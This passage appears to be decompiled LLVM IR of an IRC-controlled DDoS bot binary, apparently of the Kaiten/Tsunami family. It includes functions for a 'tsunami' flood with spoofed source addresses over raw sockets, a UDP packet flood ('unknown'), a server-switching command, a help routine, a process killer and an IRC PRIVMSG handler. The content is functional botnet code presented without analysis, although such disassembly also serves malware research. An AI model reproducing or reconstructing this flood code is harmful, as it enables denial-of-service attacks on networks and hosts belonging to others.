  uselistorder i32* %stack_var_-280, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-240, { 0, 2, 1 }
  uselistorder i32* %stack_var_-180, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100025f8, { 1, 0 }
  uselistorder label %dec_label_pc_100025f0, { 1, 0 }
  uselistorder label %dec_label_pc_100023e0, { 1, 0 }
  uselistorder label %dec_label_pc_100021fc, { 1, 0 }
  uselistorder label %dec_label_pc_10002234.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100021c4, { 1, 0 }
}

define i32 @tsunami(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 268445272, i32* @lr, align 4
  %v1_10002654 = call i32 @__GI_time(i32 0)
  %v1_10002664 = call i32 @mfork(i32 %arg2)
  %v3_1000266c = icmp eq i32 %v1_10002664, 0
  br i1 %v3_1000266c, label %dec_label_pc_10002674, label %dec_label_pc_10002a44

dec_label_pc_10002674:                            ; preds = %entry
  %v2_10002678 = icmp sgt i32 %arg3, 1
  br i1 %v2_10002678, label %dec_label_pc_100026a0, label %dec_label_pc_10002680

dec_label_pc_10002680:                            ; preds = %dec_label_pc_10002674
  %v5_10002694 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_1001805c.104 to i32), i32 %arg2, i32 268566528)
  %v0_1000269c = call i32 @__GI_exit()
  br label %dec_label_pc_100026a0

dec_label_pc_100026a0:                            ; preds = %dec_label_pc_10002674, %dec_label_pc_10002680
  %v1_100026a4 = add i32 %arg4, 8
  %v1_100026a8 = inttoptr i32 %v1_100026a4 to i32*
  %v2_100026a8 = load i32, i32* %v1_100026a8, align 4
  store i32 268445364, i32* @lr, align 4
  %v2_100026b0 = call i32 @atol(i32 %v2_100026a8, i32 %v1_100026a4)
  store i32 268445388, i32* @lr, align 4
  %v3_100026c8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp51 = icmp sgt i32 %v3_100026c8, -1
  br i1 %tmp51, label %dec_label_pc_100026e8, label %dec_label_pc_100026e0

dec_label_pc_100026e0:                            ; preds = %dec_label_pc_100026a0
  %v0_100026e4 = call i32 @__GI_exit()
  br label %dec_label_pc_100026e8

dec_label_pc_100026e8:                            ; preds = %dec_label_pc_100026a0, %dec_label_pc_100026e0
  store i32 268445424, i32* @lr, align 4
  %v1_100026ec = call i32 @__GI_time(i32 0)
  store i32 268445432, i32* @lr, align 4
  %v0_100026f4 = call i32 @__libc_getpid()
  %v2_100026fc = xor i32 %v1_100026ec, %v0_100026f4
  store i32 ptrtoint (i32* @global_var_10002708.107 to i32), i32* @lr, align 4
  %v1_10002704 = call i32 @srand(i32 %v2_100026fc)
  store i32 268445452, i32* @lr, align 4
  %v0_10002708 = call i32 @random()
  %v2_10002710 = ptrtoint i32* %stack_var_-168 to i32
  %v2_10002714 = ptrtoint i32* %stack_var_-128 to i32
  store i32 268445480, i32* @lr, align 4
  %v3_10002724 = call i32 @__GI_memset(i32 %v2_10002714, i32 %v0_10002708, i32 1400)
  %v1_1000272c = add i32 %arg4, 4
  %v1_10002730 = inttoptr i32 %v1_1000272c to i32*
  %v2_10002730 = load i32, i32* %v1_10002730, align 4
  store i32 268445504, i32* @lr, align 4
  %v3_1000273c = call i32 @host2ip(i32 %arg2, i32 %v2_10002730, i32 %v1_1000272c)
  %v2_10002750 = load i32, i32* %v1_10002730, align 4
  %v6_1000276c = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_10018080.108 to i32), i32 %arg2, i32 %v2_10002750)
  %v2_100028fc = bitcast i32* %stack_var_-168 to i16*
  %v2_10002964 = ptrtoint i32* %stack_var_-148 to i32
  %v2_10002968 = ptrtoint i32* %stack_var_-108 to i32
  %v2_1000296c = ptrtoint i32* %stack_var_-96 to i32
  %v2_1000298c = ptrtoint i32* %stack_var_-76 to i32
  %v2_100029b4 = bitcast i32* %stack_var_-108 to i16*
  %v2_100029c8 = ptrtoint i32* %stack_var_-56 to i32
  %v2_10002a10 = add i32 %v2_100026b0, %v1_10002654
  br label %dec_label_pc_10002770

dec_label_pc_10002770:                            ; preds = %dec_label_pc_10002a24, %dec_label_pc_100026e8
  %stack_var_-180.0 = phi i32 [ %tmp, %dec_label_pc_100026e8 ], [ %v1_10002a28, %dec_label_pc_10002a24 ]
  %v0_10002770 = call i32 @getspoof()
  %v1_10002784 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  store i32 %v1_10002784, i32* %stack_var_-168, align 4
  %v1_10002794 = call i32 @__asm_rlwimi(i32 4, i32 24, i32 4, i32 7)
  store i32 %v1_10002794, i32* %stack_var_-168, align 4
  store i32 1440, i32* @r3, align 4
  %v1_100027b8 = call i32 @htons(i32 1440)
  store i32 268445640, i32* @lr, align 4
  %v0_100027c4 = call i32 @random()
  store i32 268445704, i32* @lr, align 4
  %v0_10002804 = call i32 @random()
  %v1_1000280c = urem i32 %v0_10002804, 65536
  store i32 %v1_1000280c, i32* %stack_var_-148, align 4
  store i32 268445720, i32* @lr, align 4
  %v0_10002814 = call i32 @random()
  store i32 268445736, i32* @lr, align 4
  %v0_10002824 = call i32 @random()
  store i32 268445748, i32* @lr, align 4
  %v0_10002830 = call i32 @random()
  %v1_10002844 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10002854 = call i32 @__asm_rlwimi(i32 0, i32 28, i32 0, i32 3)
  %v1_10002860 = call i32 @__asm_rlwinm(i32 %v1_10002854, i32 0, i32 16, i32 14)
  %v1_1000286c = call i32 @__asm_rlwinm(i32 %v1_10002860, i32 0, i32 15, i32 13)
  %v1_10002878 = call i32 @__asm_rlwinm(i32 %v1_1000286c, i32 0, i32 14, i32 12)
  %v1_10002890 = or i32 %v1_10002878, 1572864
  %v1_1000289c = call i32 @__asm_rlwinm(i32 %v1_10002890, i32 0, i32 11, i32 9)
  %v1_100028a8 = call i32 @__asm_rlwinm(i32 %v1_1000289c, i32 0, i32 9, i32 7)
  %v1_100028b4 = call i32 @__asm_rlwinm(i32 %v1_100028a8, i32 0, i32 10, i32 8)
  store i32 2, i32* %stack_var_-56, align 4
  %v3_100028fc = call i32 @in_cksum(i16* %v2_100028fc, i32 20)
  %v3_10002914 = call i32 @in_cksum(i16* %v2_100028fc, i32 40)
  store i32 %v0_10002770, i32* %stack_var_-108, align 4
  store i32 1420, i32* @r3, align 4
  %v1_10002954 = call i32 @htons(i32 1420)
  store i32 20, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10002980.109 to i32), i32* @lr, align 4
  %v4_1000297c = call i32 @bcopy(i32 %v2_10002964, i32 %v2_1000296c, i32 20, i32 %v2_10002968)
  store i32 1400, i32* @r5, align 4
  store i32 268446112, i32* @lr, align 4
  %v4_1000299c = call i32 @bcopy(i32 %v2_10002714, i32 %v2_1000298c, i32 1400, i32 %v2_10002968)
  %v3_100029b4 = call i32 @in_cksum(i16* %v2_100029b4, i32 1432)
  store i32 268446188, i32* @lr, align 4
  %v6_100029e8 = call i32 @sendto(i32 %v3_100026c8, i32 %v2_10002710, i32 1440, i32 0, i32 %v2_100029c8, i32 16)
  %tmp52 = icmp ult i32 %stack_var_-180.0, 50
  br i1 %tmp52, label %dec_label_pc_10002a24, label %dec_label_pc_100029f8

dec_label_pc_100029f8:                            ; preds = %dec_label_pc_10002770
  store i32 268446208, i32* @lr, align 4
  %v1_100029fc = call i32 @__GI_time(i32 0)
  %v2_10002a14 = icmp ult i32 %v1_100029fc, %v2_10002a10
  br i1 %v2_10002a14, label %dec_label_pc_10002a1c, label %dec_label_pc_10002a34

dec_label_pc_10002a1c:                            ; preds = %dec_label_pc_100029f8
  br label %dec_label_pc_10002a24

dec_label_pc_10002a24:                            ; preds = %dec_label_pc_10002770, %dec_label_pc_10002a1c
  %stack_var_-180.1 = phi i32 [ %stack_var_-180.0, %dec_label_pc_10002770 ], [ 0, %dec_label_pc_10002a1c ]
  %v1_10002a28 = add i32 %stack_var_-180.1, 1
  br label %dec_label_pc_10002770

dec_label_pc_10002a34:                            ; preds = %dec_label_pc_100029f8
  store i32 ptrtoint ([3 x i8]* @global_var_10002a3c.110 to i32), i32* @lr, align 4
  %v1_10002a38 = call i32 @close(i32 %v3_100026c8)
  %v0_10002a40 = call i32 @__GI_exit()
  br label %dec_label_pc_10002a44

dec_label_pc_10002a44:                            ; preds = %entry, %dec_label_pc_10002a34
  %v0_10002a5c = phi i32 [ %v1_10002664, %entry ], [ %v0_10002a40, %dec_label_pc_10002a34 ]
  ret i32 %v0_10002a5c

; uselistorder directives
  uselistorder i32 %v2_10002968, { 1, 0 }
  uselistorder i32 %v2_10002714, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-108, { 1, 0, 2 }
  uselistorder i32 1420, { 1, 0 }
  uselistorder i32 1440, { 0, 2, 1 }
  uselistorder i32 ()* @getspoof, { 2, 1, 0 }
  uselistorder i32 1400, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002a44, { 1, 0 }
  uselistorder label %dec_label_pc_10002a24, { 1, 0 }
  uselistorder label %dec_label_pc_100026e8, { 1, 0 }
  uselistorder label %dec_label_pc_100026a0, { 1, 0 }
}

define i32 @unknown(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 1, i32* %stack_var_-48, align 4
  store i32 9216, i32* @r3, align 4
  store i32 268446356, i32* @lr, align 4
  %v0_10002a90 = call i32 @malloc()
  store i32 268446372, i32* @lr, align 4
  %v1_10002aa0 = call i32 @__GI_time(i32 0)
  %v1_10002ab0 = call i32 @mfork(i32 %arg2)
  %v3_10002ab8 = icmp eq i32 %v1_10002ab0, 0
  br i1 %v3_10002ab8, label %dec_label_pc_10002ac0, label %dec_label_pc_10002c44

dec_label_pc_10002ac0:                            ; preds = %entry
  %v2_10002ac4 = icmp sgt i32 %arg3, 1
  br i1 %v2_10002ac4, label %dec_label_pc_10002aec, label %dec_label_pc_10002acc

dec_label_pc_10002acc:                            ; preds = %dec_label_pc_10002ac0
  %v5_10002ae0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([36 x i8]* @global_var_100180a4.111 to i32), i32 %arg2, i32 268566528)
  %v0_10002ae8 = call i32 @__GI_exit()
  br label %dec_label_pc_10002aec

dec_label_pc_10002aec:                            ; preds = %dec_label_pc_10002ac0, %dec_label_pc_10002acc
  %v1_10002af0 = add i32 %arg4, 8
  %v1_10002af4 = inttoptr i32 %v1_10002af0 to i32*
  %v2_10002af4 = load i32, i32* %v1_10002af4, align 4
  store i32 268446464, i32* @lr, align 4
  %v2_10002afc = call i32 @atol(i32 %v2_10002af4, i32 %v1_10002af0)
  %v2_10002b08 = ptrtoint i32* %stack_var_-44 to i32
  store i32 268446492, i32* @lr, align 4
  %v3_10002b18 = call i32 @__GI_memset(i32 %v2_10002b08, i32 0, i32 16)
  %v1_10002b20 = add i32 %arg4, 4
  %v1_10002b24 = inttoptr i32 %v1_10002b20 to i32*
  %v2_10002b24 = load i32, i32* %v1_10002b24, align 4
  store i32 268446516, i32* @lr, align 4
  %v3_10002b30 = call i32 @host2ip(i32 %arg2, i32 %v2_10002b24, i32 %v1_10002b20)
  store i32 2, i32* %stack_var_-44, align 4
  %v2_10002b4c = load i32, i32* %v1_10002b24, align 4
  %v6_10002b68 = call i32 @Send(i32 %arg1, i32 ptrtoint ([27 x i8]* @global_var_100180c8.113 to i32), i32 %arg2, i32 %v2_10002b4c)
  %v2_10002c10 = add i32 %v2_10002afc, %v1_10002aa0
  %v2_10002ba8 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_10002b6c

dec_label_pc_10002b6c:                            ; preds = %dec_label_pc_10002c24, %dec_label_pc_10002aec
  %stack_var_-56.0 = phi i32 [ %tmp, %dec_label_pc_10002aec ], [ %v1_10002c28, %dec_label_pc_10002c24 ]
  store i32 268446576, i32* @lr, align 4
  %v0_10002b6c = call i32 @random()
  store i32 268446604, i32* @lr, align 4
  %v3_10002b88 = call i32 @socket(i32 2, i32 2, i32 17)
  %v1_10002b98 = icmp slt i32 %v3_10002b88, 0
  br i1 %v1_10002b98, label %dec_label_pc_10002bec, label %dec_label_pc_10002ba0

dec_label_pc_10002ba0:                            ; preds = %dec_label_pc_10002b6c
  store i32 1, i32* %stack_var_-48, align 4
  store i32 268446660, i32* @lr, align 4
  %v3_10002bc0 = call i32 @ioctl(i32 %v3_10002b88, i32 -2147195266, i32 %v2_10002ba8)
  store i32 268446692, i32* @lr, align 4
  %v6_10002be0 = call i32 @sendto(i32 %v3_10002b88, i32 %v0_10002a90, i32 9216, i32 0, i32 %v2_10002b08, i32 16)
  store i32 268446700, i32* @lr, align 4
  %v1_10002be8 = call i32 @close(i32 %v3_10002b88)
  br label %dec_label_pc_10002bec

dec_label_pc_10002bec:                            ; preds = %dec_label_pc_10002b6c, %dec_label_pc_10002ba0
  %tmp18 = icmp slt i32 %stack_var_-56.0, 50
  br i1 %tmp18, label %dec_label_pc_10002c24, label %dec_label_pc_10002bf8

dec_label_pc_10002bf8:                            ; preds = %dec_label_pc_10002bec
  store i32 268446720, i32* @lr, align 4
  %v1_10002bfc = call i32 @__GI_time(i32 0)
  %v2_10002c14 = icmp ult i32 %v1_10002bfc, %v2_10002c10
  br i1 %v2_10002c14, label %dec_label_pc_10002c1c, label %dec_label_pc_10002c34

dec_label_pc_10002c1c:                            ; preds = %dec_label_pc_10002bf8
  br label %dec_label_pc_10002c24

dec_label_pc_10002c24:                            ; preds = %dec_label_pc_10002bec, %dec_label_pc_10002c1c
  %stack_var_-56.1 = phi i32 [ %stack_var_-56.0, %dec_label_pc_10002bec ], [ 0, %dec_label_pc_10002c1c ]
  %v1_10002c28 = add i32 %stack_var_-56.1, 1
  br label %dec_label_pc_10002b6c

dec_label_pc_10002c34:                            ; preds = %dec_label_pc_10002bf8
  store i32 ptrtoint ([3 x i8]* @global_var_10002c3c.115 to i32), i32* @lr, align 4
  %v1_10002c38 = call i32 @close(i32 %v3_10002b88)
  %v0_10002c40 = call i32 @__GI_exit()
  br label %dec_label_pc_10002c44

dec_label_pc_10002c44:                            ; preds = %entry, %dec_label_pc_10002c34
  %v0_10002c58 = phi i32 [ %v1_10002ab0, %entry ], [ %v0_10002c40, %dec_label_pc_10002c34 ]
  ret i32 %v0_10002c58

; uselistorder directives
  uselistorder i32* %stack_var_-48, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @host2ip, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @atol, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002c44, { 1, 0 }
  uselistorder label %dec_label_pc_10002c24, { 1, 0 }
  uselistorder label %dec_label_pc_10002bec, { 1, 0 }
  uselistorder label %dec_label_pc_10002aec, { 1, 0 }
}

define i32 @move(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_10002c84 = icmp sgt i32 %arg3, 0
  br i1 %v2_10002c84, label %dec_label_pc_10002cac, label %dec_label_pc_10002c8c

dec_label_pc_10002c8c:                            ; preds = %entry
  %v5_10002ca0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_100180e4.116 to i32), i32 %arg2, i32 268566528)
  %v0_10002ca8 = call i32 @__GI_exit()
  br label %dec_label_pc_10002cac

dec_label_pc_10002cac:                            ; preds = %entry, %dec_label_pc_10002c8c
  %v1_10002cb0 = add i32 %arg4, 4
  %v1_10002cb4 = inttoptr i32 %v1_10002cb0 to i32*
  %v2_10002cb4 = load i32, i32* %v1_10002cb4, align 4
  store i32 268446912, i32* @lr, align 4
  %v1_10002cbc = call i32 @__GI_strdup(i32 %v2_10002cb4)
  store i32 %v1_10002cbc, i32* @global_var_1002efe0.118, align 4
  store i32 1, i32* @global_var_1002efb8.119, align 4
  store i32 268446944, i32* @lr, align 4
  %v1_10002cdc = call i32 @close(i32 %arg1)
  ret i32 %v1_10002cdc

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10002cac, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_10002d20 = call i32 @mfork(i32 %arg2)
  %v3_10002d28 = icmp eq i32 %v1_10002d20, 0
  br i1 %v3_10002d28, label %dec_label_pc_10002d30, label %dec_label_pc_10002f50

dec_label_pc_10002d30:                            ; preds = %entry
  %v5_10002d44 = call i32 @Send(i32 %arg1, i32 ptrtoint ([119 x i8]* @global_var_10018100.120 to i32), i32 %arg2, i32 268566528)
  store i32 268447056, i32* @lr, align 4
  %v1_10002d4c = call i32 @sleep(i32 2)
  %v5_10002d64 = call i32 @Send(i32 %arg1, i32 ptrtoint ([123 x i8]* @global_var_10018178.122 to i32), i32 %arg2, i32 268566528)
  store i32 268447088, i32* @lr, align 4
  %v1_10002d6c = call i32 @sleep(i32 2)
  %v5_10002d84 = call i32 @Send(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_100181f4.124 to i32), i32 %arg2, i32 268566528)
  store i32 268447120, i32* @lr, align 4
  %v1_10002d8c = call i32 @sleep(i32 2)
  %v5_10002da4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_10018244.126 to i32), i32 %arg2, i32 268566528)
  store i32 268447152, i32* @lr, align 4
  %v1_10002dac = call i32 @sleep(i32 2)
  %v5_10002dc4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([94 x i8]* @global_var_100182a4.128 to i32), i32 %arg2, i32 268566528)
  store i32 268447184, i32* @lr, align 4
  %v1_10002dcc = call i32 @sleep(i32 2)
  %v5_10002de4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([79 x i8]* @global_var_10018304.130 to i32), i32 %arg2, i32 268566528)
  store i32 268447216, i32* @lr, align 4
  %v1_10002dec = call i32 @sleep(i32 2)
  %v5_10002e04 = call i32 @Send(i32 %arg1, i32 ptrtoint ([89 x i8]* @global_var_10018354.132 to i32), i32 %arg2, i32 268566528)
  store i32 268447248, i32* @lr, align 4
  %v1_10002e0c = call i32 @sleep(i32 2)
  %v5_10002e24 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_100183b0.134 to i32), i32 %arg2, i32 268566528)
  store i32 268447280, i32* @lr, align 4
  %v1_10002e2c = call i32 @sleep(i32 2)
  %v5_10002e44 = call i32 @Send(i32 %arg1, i32 ptrtoint ([103 x i8]* @global_var_1001840c.136 to i32), i32 %arg2, i32 268566528)
  store i32 268447312, i32* @lr, align 4
  %v1_10002e4c = call i32 @sleep(i32 2)
  %v5_10002e64 = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_10018474.138 to i32), i32 %arg2, i32 268566528)
  store i32 268447344, i32* @lr, align 4
  %v1_10002e6c = call i32 @sleep(i32 2)
  %v5_10002e84 = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_100184dc.140 to i32), i32 %arg2, i32 268566528)
  store i32 268447376, i32* @lr, align 4
  %v1_10002e8c = call i32 @sleep(i32 2)
  %v5_10002ea4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([117 x i8]* @global_var_1001852c.142 to i32), i32 %arg2, i32 268566528)
  store i32 268447408, i32* @lr, align 4
  %v1_10002eac = call i32 @sleep(i32 2)
  %v5_10002ec4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([90 x i8]* @global_var_100185a4.144 to i32), i32 %arg2, i32 268566528)
  store i32 268447440, i32* @lr, align 4
  %v1_10002ecc = call i32 @sleep(i32 2)
  %v5_10002ee4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([91 x i8]* @global_var_10018600.146 to i32), i32 %arg2, i32 268566528)
  store i32 268447472, i32* @lr, align 4
  %v1_10002eec = call i32 @sleep(i32 2)
  %v5_10002f04 = call i32 @Send(i32 %arg1, i32 ptrtoint ([77 x i8]* @global_var_1001865c.148 to i32), i32 %arg2, i32 268566528)
  %v5_10002f1c = call i32 @Send(i32 %arg1, i32 ptrtoint ([96 x i8]* @global_var_100186ac.149 to i32), i32 %arg2, i32 268566528)
  store i32 268447528, i32* @lr, align 4
  %v1_10002f24 = call i32 @sleep(i32 2)
  %v5_10002f3c = call i32 @Send(i32 %arg1, i32 ptrtoint ([82 x i8]* @global_var_1001870c.151 to i32), i32 %arg2, i32 268566528)
  store i32 ptrtoint ([3 x i8]* @global_var_10002f48.153 to i32), i32* @lr, align 4
  %v1_10002f44 = call i32 @sleep(i32 2)
  %v0_10002f4c = call i32 @__GI_exit()
  br label %dec_label_pc_10002f50

dec_label_pc_10002f50:                            ; preds = %entry, %dec_label_pc_10002d30
  %v0_10002f64 = phi i32 [ %v1_10002d20, %entry ], [ %v0_10002f4c, %dec_label_pc_10002d30 ]
  ret i32 %v0_10002f64

; uselistorder directives
  uselistorder label %dec_label_pc_10002f50, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10002f80 = load i32, i32* %r3.global-to-local, align 4
  %v3_100030682 = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_100030703 = icmp eq i32 %v3_100030682, 0
  br i1 %v2_100030703, label %dec_label_pc_10003078, label %dec_label_pc_10002f9c.lr.ph

dec_label_pc_10002f9c.lr.ph:                      ; preds = %entry
  %v3_10002ff0 = icmp eq i32 %arg2, 0
  br label %dec_label_pc_10002f9c

dec_label_pc_10002f9c:                            ; preds = %dec_label_pc_10002f9c.lr.ph, %dec_label_pc_10003058
  %v0_100030909 = phi i32 [ %v0_10002f80, %dec_label_pc_10002f9c.lr.ph ], [ %v0_100030908, %dec_label_pc_10003058 ]
  %storemerge15 = phi i32 [ 0, %dec_label_pc_10002f9c.lr.ph ], [ %v1_1000305c, %dec_label_pc_10003058 ]
  %v1_10002fa0 = mul i32 %storemerge15, 4
  %v3_10002fac = load i32, i32* @global_var_1002efec.26, align 4
  %v2_10002fb0 = add i32 %v3_10002fac, %v1_10002fa0
  %v1_10002fb4 = inttoptr i32 %v2_10002fb0 to i32*
  %v2_10002fb4 = load i32, i32* %v1_10002fb4, align 4
  %v3_10002fb8 = icmp eq i32 %v2_10002fb4, 0
  br i1 %v3_10002fb8, label %dec_label_pc_10003058, label %dec_label_pc_10002fc0

dec_label_pc_10002fc0:                            ; preds = %dec_label_pc_10002f9c
  %v2_10002fd8 = load i32, i32* %v1_10002fb4, align 4
  store i32 268447712, i32* @lr, align 4
  %v0_10002fdc = call i32 @__libc_getpid()
  store i32 %v0_10002fdc, i32* %r3.global-to-local, align 4
  %v4_10002fe4 = icmp eq i32 %v2_10002fd8, %v0_10002fdc
  br i1 %v4_10002fe4, label %dec_label_pc_10003058, label %dec_label_pc_10002fec

dec_label_pc_10002fec:                            ; preds = %dec_label_pc_10002fc0
  br i1 %v3_10002ff0, label %dec_label_pc_10003030, label %dec_label_pc_10002ff8

dec_label_pc_10002ff8:                            ; preds = %dec_label_pc_10002fec
  %v3_10003008 = load i32, i32* @global_var_1002efec.26, align 4
  %v2_1000300c = add i32 %v3_10003008, %v1_10002fa0
  %v1_10003010 = inttoptr i32 %v2_1000300c to i32*
  %v2_10003010 = load i32, i32* %v1_10003010, align 4
  store i32 %v0_10002f80, i32* %r3.global-to-local, align 4
  %v6_1000302c = call i32 @Send(i32 %v0_10002f80, i32 ptrtoint ([28 x i8]* @global_var_10018760.154 to i32), i32 %arg2, i32 %v2_10003010)
  store i32 %v6_1000302c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003030

dec_label_pc_10003030:                            ; preds = %dec_label_pc_10002fec, %dec_label_pc_10002ff8
  %v3_10003040 = load i32, i32* @global_var_1002efec.26, align 4
  %v2_10003044 = add i32 %v3_10003040, %v1_10002fa0
  %v1_10003048 = inttoptr i32 %v2_10003044 to i32*
  %v2_10003048 = load i32, i32* %v1_10003048, align 4
  store i32 %v2_10003048, i32* %r3.global-to-local, align 4
  store i32 268447832, i32* @lr, align 4
  %v2_10003054 = call i32 @kill(i32 %v2_10003048, i32 9)
  store i32 %v2_10003054, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10003058

dec_label_pc_10003058:                            ; preds = %dec_label_pc_10002fc0, %dec_label_pc_10002f9c, %dec_label_pc_10003030
  %v0_100030908 = phi i32 [ %v0_10002fdc, %dec_label_pc_10002fc0 ], [ %v0_100030909, %dec_label_pc_10002f9c ], [ %v2_10003054, %dec_label_pc_10003030 ]
  %v1_1000305c = add i32 %storemerge15, 1
  %v3_10003068 = load i32, i32* @global_var_1002efc8.25, align 4
  %v2_10003070 = icmp ult i32 %v1_1000305c, %v3_10003068
  br i1 %v2_10003070, label %dec_label_pc_10002f9c, label %dec_label_pc_10003064.dec_label_pc_10003078_crit_edge

dec_label_pc_10003064.dec_label_pc_10003078_crit_edge: ; preds = %dec_label_pc_10003058
  br label %dec_label_pc_10003078

dec_label_pc_10003078:                            ; preds = %entry, %dec_label_pc_10003064.dec_label_pc_10003078_crit_edge
  %v0_10003090 = phi i32 [ %v0_100030908, %dec_label_pc_10003064.dec_label_pc_10003078_crit_edge ], [ %v0_10002f80, %entry ]
  ret i32 %v0_10003090

; uselistorder directives
  uselistorder i32 %v1_10002fa0, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %v0_10002f80, { 0, 3, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder label %dec_label_pc_10003078, { 1, 0 }
  uselistorder label %dec_label_pc_10003058, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10003030, { 1, 0 }
  uselistorder label %dec_label_pc_10002f9c, { 1, 0 }
}

define i32 @killd(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v6_100030c8 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_10017a98.23 to i32), i32 ptrtoint ([3 x i8]* @global_var_10010000.19 to i32), i32 %arg4)
  ret i32 %v6_100030c8
}

define i32 @_PRIVMSG(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-2168 = alloca i32, align 4
  %stack_var_-1072 = alloca i32, align 4
  %stack_var_-2096 = alloca i32, align 4
  %stack_var_-2176 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_100030e4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_100030e4, i32* %stack_var_-2176, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_1000312870 = call i32 @__GI_strlen()
  store i32 %v0_1000312870, i32* %r3.global-to-local, align 4
  %v0_1000313071 = load i32, i32* %r29.global-to-local, align 4
  %v2_1000313072 = icmp ult i32 %v0_1000313071, %v0_1000312870
  br i1 %v2_1000313072, label %dec_label_pc_10003138, label %dec_label_pc_10003158

dec_label_pc_10003114:                            ; preds = %dec_label_pc_10003138
  %v1_10003118 = add i32 %storemerge875, 1
  store i32 %v1_10003118, i32* %r29.global-to-local, align 4
  store i32 %arg3, i32* @r3, align 4
  %v0_10003128 = call i32 @__GI_strlen()
  store i32 %v0_10003128, i32* %r3.global-to-local, align 4
  %v0_10003130 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003130 = icmp ult i32 %v0_10003130, %v0_10003128
  br i1 %v2_10003130, label %dec_label_pc_10003138, label %dec_label_pc_10003158

dec_label_pc_10003138:                            ; preds = %entry, %dec_label_pc_10003114
  %storemerge875 = phi i32 [ %v1_10003118, %dec_label_pc_10003114 ], [ 0, %entry ]
  %v2_10003144 = add i32 %storemerge875, %arg3
  %v1_10003148 = inttoptr i32 %v2_10003144 to i8*
  %v2_10003148 = load i8, i8* %v1_10003148, align 1
  %v3_10003150 = icmp eq i8 %v2_10003148, 32
  br i1 %v3_10003150, label %dec_label_pc_10003158, label %dec_label_pc_10003114

dec_label_pc_10003158:                            ; preds = %dec_label_pc_10003114, %dec_label_pc_10003138, %entry
  %storemerge8.lcssa = phi i32 [ 0, %entry ], [ %v1_10003118, %dec_label_pc_10003114 ], [ %storemerge875, %dec_label_pc_10003138 ]
  %v2_10003164 = add i32 %storemerge8.lcssa, %arg3
  %v3_1000316c = inttoptr i32 %v2_10003164 to i8*
  store i8 0, i8* %v3_1000316c, align 1
  %v1_10003188 = add i32 %v2_10003164, 2
  %v5_1000318c = inttoptr i32 %v1_10003188 to i8*
